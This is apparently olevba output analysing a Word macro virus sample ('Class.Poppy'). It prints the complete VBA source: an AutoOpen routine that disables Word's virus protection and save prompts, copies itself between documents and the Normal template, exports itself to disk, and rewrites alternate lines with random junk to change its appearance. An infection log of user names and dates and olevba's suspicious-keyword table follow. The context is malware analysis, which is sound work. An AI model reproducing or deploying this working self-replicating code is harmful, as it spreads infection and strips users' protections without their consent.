olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.g-2f4fa7caecfd26d8e639cc353959794925579f17
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.g-2f4fa7caecfd26d8e639cc353959794925579f17 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
P141oM = Gti9 + Aji82
On Error GoTo out
S153iI = Vgy10 + Uro118
Options.VirusProtection = False
K197tN = Out182 + Shn45
Options.SaveNormalPrompt = False
P20eF = Lxe20 + Ozn159
ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
G32yG = Itf32 + Vrt129
nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
J91qP = Hmv181 + Eny52
If nt > 40 And ad > 0 Then GoTo out
R138rG = Umm182 + Jxn166
If nt < 40 Then
A80oU = Jlo53 + Lps11
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
F125eB = Irp108 + Dpu31
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
U166lL = Ixi3 + Kjm42
    ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines (ad + 1), "' I infected " & Application.UserName & " on: " & Now
B16xH = Czo38 + Ooh135
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\" & Application.UserInitials
J92sD = Pfo98 + Bjr41
End If
H150xM = Dfx54 + Jtg134
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
F68yA = Hit8 + Fpu96
host.CodeModule.AddFromFile ("c:\" & Application.UserInitials)
E82gM = Qfs192 + Lym22
host.CodeModule.DeleteLines 1, 4
U69mH = Dpv109 + Vxz184
If nt < 40 Then host.CodeModule.replaceline 1, "Sub AutoClose()"
L82rS = Slk139 + Vsp35
With host.CodeModule
J136oR = Lqo177 + Fmp74
    For x = 2 To 48 Step 2
G38tD = Lvn136 + Hgp149
    .replaceline x, (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 200) & (Chr(122 - Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " = " & (Chr(65 + Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & Int(Rnd * 200) & " + " & (Chr(65 + Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & Int(Rnd * 200)
N75iD = Rve92 + Byi23
    Next x
C150wB = Pon79 + Epj180
End With
Q160yN = Pzq139 + Ite83
out:
Q37tH = Jfx15 + Osx86
If nt > 40 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
V27oK = Vvr103 + Ito193
End Sub

' Class.Poppy.Gold Infection Log
' ------------------------------
' I infected student on: 10/19/98 8:07:52 PM
' I infected student on: 10/26/98 1:15:53 PM
' I infected Academic Computing on: 11/3/98 9:43:10 AM
' I infected student on: 11/3/98 10:38:41 AM
' I infected student on: 11/3/98 1:29:33 PM
' I infected Academic Computing on: 11/23/98 3:30:27 PM
' I infected student on: 12/9/98 12:19:35 PM
' I infected Academic Computing on: 12/14/98 8:09:09 AM
' I infected Chirag Shah on: 2/27/99 2:07:00 PM
' I infected Fdesk on: 3/15/99 2:33:54 PM
' I infected Mis on: 3/22/99 2:24:06 PM
' I infected Mis on: 3/30/99 11:13:01 AM
' I infected District Heights on: 5/7/99 9:24:39 AM
' I infected Clerk on: 08/11/1999 5:46:18 PM
' I infected BERRY on: 07/12/2000 8:37:30 PM
' I infected Dirty PC on: 07/12/00 08:35:01
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

